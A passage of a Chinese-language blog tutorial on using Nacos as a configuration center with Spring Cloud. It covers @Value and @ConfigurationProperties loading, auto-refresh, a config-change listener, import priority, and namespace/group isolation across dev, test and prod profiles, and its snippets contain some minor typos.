4.在创建data-id数据集\n要使用这些配置文件，可以使用Value注解加载\n1 2 3 4 5 6 7 8 9 10 11 @Value(\u0026#34;${order.timeout}\u0026#34;) String orderTimeouut; @Value(\u0026#34;${order.auto-confirm}\u0026#34;) String orderConfirm; @GetMapping(\u0026#34;/config\u0026#34;) String config(){ System.out.println(\u0026#34;orderTimeouut:\u0026#34;+orderTimeouut); System.out.println(\u0026#34;orderConfirm:\u0026#34;+orderConfirm); return orderTimeouut+\u0026#34; \u0026#34;+orderConfirm; } 此时如果直接修改Nacos配置文件的值，这个配置文件是不会自动刷新的，如果想要开启自动刷新的话，需要使用注解在类上添加\n1 @RefreshScope //开启配置文件自动刷新注解 一旦项目导入了Nacos的配置中心，那么项目启动前配置文件必须导入Nacos的配置，如果没有导入那么项目会启动报错\n1 2 3 4 两种解决方法 1.禁用Nacos的导入检查 spring.cloud.nacos.config.import-check.enabled=false 2.设置Nacos的导入为可选的，不是必须的 无感知自动刷新 创建一个properties配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.example.properties; import lombok.Data; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.stereotype.Component; @Data @Component @ConfigurationProperties(prefix = \u0026#34;order\u0026#34;) public class OrderProperties { String timeouut; String autoconfirm; } 想要使用配置文件直接依赖注入即可\n1 2 3 4 5 6 7 8 9 10 @Autowired OrderProperties orderProperties; @GetMapping(\u0026#34;/config\u0026#34;) String config(){ System.out.println(\u0026#34;orderTimeouut:\u0026#34;+orderProperties.getTimeout()); System.out.println(\u0026#34;orderConfirm:\u0026#34;+orderProperties.getAutoconfirm()); return orderProperties.getTimeout()+\u0026#34; \u0026#34;+orderProperties.getAutoconfirm(); } 配置监听 先说一个场景：当Nacos的配置文件发生变更时发送邮件给开发者\n项目启动时监听Nacos配置文件变化 1. 获取最新的配置数据 2. 发送邮件通知开发者 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.example; import com.alibaba.cloud.nacos.NacosConfigManager; import com.alibaba.nacos.api.config.listener.Listener; import com.alibaba.nacos.client.config.NacosConfigService; import org.springframework.boot.ApplicationArguments; import org.springframework.boot.ApplicationRunner; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.context.annotation.Bean; import java.util.concurrent.Executor; @EnableDiscoveryClient @SpringBootApplication public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } /** * 项目启动时监听Nacos配置文件变化 * 1. 获取最新的配置数据 * 2. 发送邮件通知开发者 */ @Bean public ApplicationRunner runner(NacosConfigManager nacosConfigManager) { return args -\u0026gt; { NacosConfigService nacosConfigService = (NacosConfigService) nacosConfigManager.getConfigService(); nacosConfigService.addListener( \u0026#34;com.example.OrderProperties\u0026#34;, \u0026#34;defaultGroup\u0026#34;, new Listener() { @Override public Executor getExecutor() { return Runnable::run; // 修正：原代码中的Executor.newFixedThreadPool(4)不正确 } @Override public void receiveConfigInfo(String configInfo) { System.out.println(\u0026#34;配置文件更新了，最新的配置信息为：\u0026#34; + configInfo); // 发送邮件通知开发者 // 此处省略发送邮件的代码 System.out.println(\u0026#34;邮件已发送\u0026#34;); } } ); }; } } 思考：如果Nacos的配置文件数据集和项目中的配置文件有相同项，哪个会生效？\n先导入优先，外部优先，所以Nacos的配置文件会优先生效\n1 2 3 4 5 6 spring.application.name=service-order sercer.port=8000 spring.cloud.nacos.server-addr=127.0.0.1:8848 spring.config.import=nacos:service-order.properties,nacos:common.properties //service-order.properties优先级最高common.properties第二高 spring.cloud.nacos.config.import-check.enabled=false 数据隔离 先说场景：假设现在有这么一个需求：项目有多套环境：开发，测试，生产环境，而每一个环境在每套环境下配置文件都不一样\n难点：区分多套环境，区分多种配置，区分多种微服务该怎么解决\n解决方法：\n使用Namespace名称空间区分多套环境，使用Group分组区分多种微服务，使用Data-id数据集区分多种配置\n如何实现呢？？？\n1.在Nacos的命名空间中新建名称空间\n2.创建好开发测试生产环境的命名空间后，在配置管理者找到对应空间，新增配置\n3.动态切换环境\n在微服务的配置文件中定义命名空间和组名，但是这样子不能实现动态切换环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sercer: port: 8000 spring: application: name: service-order cloud: nacos: server-addr: 127.0.0.1:8848 import-check: enabled=false: config: namespace: dev config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order 完整的配置文件如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 sercer: port: 8000 spring: profiles: active: dev //选择dev环境的配置文件 //active：test //选择test环境下的配置文件 application: name: service-order cloud: nacos: server-addr: 127.0.0.1:8848 import-check: enabled=false: config: namespace: ${spring.profiles.active:public} --- //三个杠表示多文档模式 spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order activate: on-profile: dev --- spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order - nacos:redis.properties?group=order activate: on-profile: test --- spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order - nacos:haha.properties?group=order activate: on-profile: prod ","date":"2025-06-08T11:24:22+08:00","image":"https://lserein.github.io/p/nacos/Nacos_hu_5436af82e36fa2df.jpg","permalink":"https://lserein.github.io/p/nacos/","title":"Nacos"}]